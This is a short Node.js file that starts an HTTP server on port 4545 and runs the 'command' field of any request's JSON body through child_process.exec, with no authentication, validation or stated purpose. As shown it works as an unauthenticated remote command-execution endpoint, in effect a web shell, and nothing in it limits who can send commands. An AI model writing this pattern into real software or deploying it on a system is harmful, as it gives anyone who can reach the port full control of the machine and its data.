var http = require('http');
var url = require('url');

const { exec } = require('child_process');


const command = function(cmd){
	exec(cmd, (err, stdout, stderr) => {
		if (err) {
			console.error(err);
			return;
		}
		console.log(stdout);
	})
}

http.createServer(function (req, res) {
	let query =  url.parse(req.url, true).query;

	var body = ''
	req.on('data', function(chunck){
		body += chunck
	})

	req.on('end', function(){
		body = JSON.parse(body)
		command(body.command)
		res.writeHead(200, {'Content-Type': 'text/html'});
		res.end();
	})


}).listen(4545);
